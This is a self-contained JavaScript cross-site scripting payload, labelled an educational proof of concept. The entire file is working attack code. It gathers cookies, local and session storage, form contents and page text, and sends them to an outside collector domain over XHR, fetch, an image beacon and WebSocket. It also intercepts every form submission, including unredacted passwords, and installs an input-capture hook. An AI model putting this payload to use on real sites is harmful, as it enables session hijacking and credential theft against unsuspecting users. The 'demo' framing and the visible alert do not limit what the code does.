(function() {
    'use strict';
    
    console.log('üîç XSS PoC Loaded - Educational Demo');
    
    // Configuration
    const CONFIG = {
        // Replace with your webhook/collector URL
        exfilEndpoint: 'xvwlwtgrdp6edzhd9e891mesuj0ao1lpa.oastify.com',
        // Or use RequestBin, Burp Collaborator, etc.
        debug: true
    };

    /**
     * Collect victim information
     */
    function collectData() {
        const data = {
            // Basic Info
            timestamp: new Date().toISOString(),
            url: window.location.href,
            origin: window.location.origin,
            referrer: document.referrer,
            
            // Browser Info
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            cookiesEnabled: navigator.cookieEnabled,
            
            // Screen Info
            screenResolution: `${screen.width}x${screen.height}`,
            colorDepth: screen.colorDepth,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            
            // Sensitive Data
            cookies: document.cookie,
            localStorage: JSON.stringify(localStorage),
            sessionStorage: JSON.stringify(sessionStorage),
            
            // DOM Info
            title: document.title,
            domainName: document.domain,
            
            // Forms (if any)
            forms: Array.from(document.forms).map(form => ({
                action: form.action,
                method: form.method,
                inputs: Array.from(form.elements).map(el => ({
                    name: el.name,
                    type: el.type,
                    value: el.type === 'password' ? '[REDACTED]' : el.value
                }))
            })),
            
            // Links
            links: Array.from(document.links).slice(0, 10).map(link => link.href),
            
            // Scripts loaded
            scripts: Array.from(document.scripts).map(s => s.src).filter(Boolean),
            
            // Meta tags
            metaTags: Array.from(document.querySelectorAll('meta')).map(meta => ({
                name: meta.name || meta.property,
                content: meta.content
            }))
        };
        
        return data;
    }

    /**
     * Take a simple screenshot (text-based)
     */
    function captureScreenshot() {
        try {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            
            canvas.width = Math.min(window.innerWidth, 1200);
            canvas.height = Math.min(window.innerHeight, 800);
            
            // White background
            ctx.fillStyle = '#ffffff';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            
            // Draw text content
            ctx.fillStyle = '#000000';
            ctx.font = '12px monospace';
            
            const text = document.body.innerText || document.body.textContent;
            const lines = text.split('\n').slice(0, 50);
            
            lines.forEach((line, i) => {
                ctx.fillText(line.substring(0, 100), 10, 20 + (i * 15));
            });
            
            return canvas.toDataURL('image/png');
        } catch (e) {
            return `Screenshot failed: ${e.message}`;
        }
    }

    /**
     * Exfiltrate data using multiple methods
     */
    function exfiltrate(data) {
        if (CONFIG.debug) {
            console.log('üì¶ Collected Data:', data);
        }
        
        // Method 1: XMLHttpRequest (most reliable)
        try {
            const xhr = new XMLHttpRequest();
            xhr.open('POST', CONFIG.exfilEndpoint, true);
            xhr.setRequestHeader('Content-Type', 'application/json');
            xhr.onload = function() {
                if (CONFIG.debug) {
                    console.log('‚úÖ XHR exfiltration successful:', xhr.status);
                }
            };
            xhr.onerror = function() {
                if (CONFIG.debug) {
                    console.log('‚ùå XHR exfiltration failed');
                }
            };
            xhr.send(JSON.stringify(data));
        } catch (e) {
            console.error('XHR Error:', e);
        }
        
        // Method 2: Fetch API (modern alternative)
        if (typeof fetch !== 'undefined') {
            fetch(CONFIG.exfilEndpoint, {
                method: 'POST',
                mode: 'no-cors', // Bypass CORS
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            }).then(() => {
                if (CONFIG.debug) {
                    console.log('‚úÖ Fetch exfiltration successful');
                }
            }).catch(e => {
                if (CONFIG.debug) {
                    console.log('‚ùå Fetch exfiltration failed:', e);
                }
            });
        }
        
        // Method 3: Image beacon (works even with strict CSP)
        try {
            const img = new Image();
            const compressed = btoa(JSON.stringify({
                url: data.url,
                cookies: data.cookies,
                userAgent: data.userAgent
            })).substring(0, 2000); // URL length limit
            
            img.src = `${CONFIG.exfilEndpoint}?data=${encodeURIComponent(compressed)}`;
            
            if (CONFIG.debug) {
                console.log('‚úÖ Image beacon sent');
            }
        } catch (e) {
            console.error('Image beacon error:', e);
        }
        
        // Method 4: WebSocket (if available)
        if (typeof WebSocket !== 'undefined') {
            try {
                const ws = new WebSocket(CONFIG.exfilEndpoint.replace('https://', 'wss://').replace('http://', 'ws://'));
                ws.onopen = function() {
                    ws.send(JSON.stringify(data));
                    if (CONFIG.debug) {
                        console.log('‚úÖ WebSocket exfiltration successful');
                    }
                    ws.close();
                };
            } catch (e) {
                // WebSocket might not be supported or endpoint might not accept WS
            }
        }
    }

    /**
     * Hook into form submissions
     */
    function hookForms() {
        document.addEventListener('submit', function(e) {
            const form = e.target;
            const formData = new FormData(form);
            const data = {
                type: 'form_submission',
                timestamp: new Date().toISOString(),
                action: form.action,
                method: form.method,
                fields: {}
            };
            
            for (let [key, value] of formData.entries()) {
                data.fields[key] = value;
            }
            
            exfiltrate(data);
            
            if (CONFIG.debug) {
                console.log('üìù Form submission captured:', data);
            }
        }, true);
    }

    /**
     * Hook into input fields (keylogger)
     */
    function hookInputs() {
        document.addEventListener('input', function(e) {
            if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
                const data = {
                    type: 'input_capture',
                    timestamp: new Date().toISOString(),
                    name: e.target.name,
                    id: e.target.id,
                    type: e.target.type,
                    value: e.target.type === 'password' ? '[REDACTED]' : e.target.value
                };
                
                if (CONFIG.debug) {
                    console.log('‚å®Ô∏è Input captured:', data);
                }
                
                // Optionally exfiltrate on every keystroke (noisy!)
                // exfiltrate(data);
            }
        }, true);
    }

    /**
     * Create a visible alert (for PoC demonstration)
     */
    function createVisualAlert() {
        const alertBox = document.createElement('div');
        alertBox.style.cssText = `
            position: fixed;
            top: 20px;
            right: 20px;
            background: #ff4444;
            color: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.3);
            z-index: 999999;
            font-family: monospace;
            max-width: 300px;
        `;
        alertBox.innerHTML = `
            <strong>‚ö†Ô∏è XSS PoC Active</strong><br>
            <small>This is a security demonstration.</small><br>
            <small>Data is being collected for educational purposes.</small>
            <button onclick="this.parentElement.remove()" style="margin-top:10px;padding:5px 10px;cursor:pointer;">
                Close
            </button>
        `;
        document.body.appendChild(alertBox);
        
        // Auto-remove after 10 seconds
        setTimeout(() => {
            if (alertBox.parentElement) {
                alertBox.remove();
            }
        }, 10000);
    }

    /**
     * Main execution
     */
    function execute() {
        console.log('üöÄ Starting XSS PoC...');
        
        // Collect initial data
        const data = collectData();
        
        // Add screenshot
        data.screenshot = captureScreenshot();
        
        // Exfiltrate
        exfiltrate(data);
        
        // Hook forms and inputs
        hookForms();
        hookInputs();
        
        // Show visual alert (for demonstration)
        createVisualAlert();
        
        console.log('‚úÖ XSS PoC execution complete');
    }

    // Execute when DOM is ready
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', execute);
    } else {
        execute();
    }

})();
